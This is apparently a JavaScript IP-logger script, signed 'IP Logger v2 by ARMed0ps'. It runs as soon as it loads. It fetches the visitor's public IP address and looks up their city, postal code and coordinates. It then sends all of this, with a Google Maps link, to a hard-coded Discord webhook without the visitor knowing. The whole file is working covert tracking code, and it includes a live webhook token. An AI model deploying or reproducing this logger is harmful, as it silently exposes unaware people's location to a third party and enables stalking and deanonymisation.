const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1390317122021888133/p2V1t9zy1QLH7uOzsiH2K9ZiA-5RJ8ve6L45u-FRO25L79Awm9aFNDc1JoHuPegpc1a7';

                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "1pl0gg3r",
                            avatar_url: "https://armed0ps.github.io/IP-Logger-new/hackerpfp.jpg",
                            content: "@everyone",
                            embeds: [
                                {
                                    title: "📡 New Visitor Logged",
                                    color: 0x800080,
                                    fields: [
                                        {
                                            name: "🧠 IP Address",
                                            value: `${ipadd}`,
                                            inline: true
                                        },
                                        {
                                            name: "🌍 Location",
                                            value: `**City:** ${geoData.city}\n**Region:** ${geoData.region}\n**Country:** ${geoData.country_name}`,
                                            inline: true
                                        },
                                        {
                                            name: "📮 Postal & Coords",
                                            value: `**Postal Code:** ${geoData.postal}\n**Latitude:** ${geoData.latitude}\n**Longitude:** ${geoData.longitude}`
                                        },
                                        {
                                            name: "🗺️ Google Maps",
                                            value: `[📍 View Location](https://www.google.com/maps?q=${geoData.latitude},${geoData.longitude})`
                                        },
                                        {
                                            name: "📘 Full IP Data",
                                            value: `[🌐 View Full JSON](https://ipapi.co/${ipadd}/json/)`
                                        }
                                    ],
                                    thumbnail: {
                                        url: "https://armed0ps.github.io/IP-Logger-new/hackerpfp.jpg"
                                    },
                                    footer: {
                                        text: "IP Logger v2 by ARMed0ps",
                                        icon_url: "https://armed0ps.github.io/IP-Logger-new/hackerpfp.jpg"
                                    },
                                    timestamp: new Date().toISOString()
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};

sendIP();
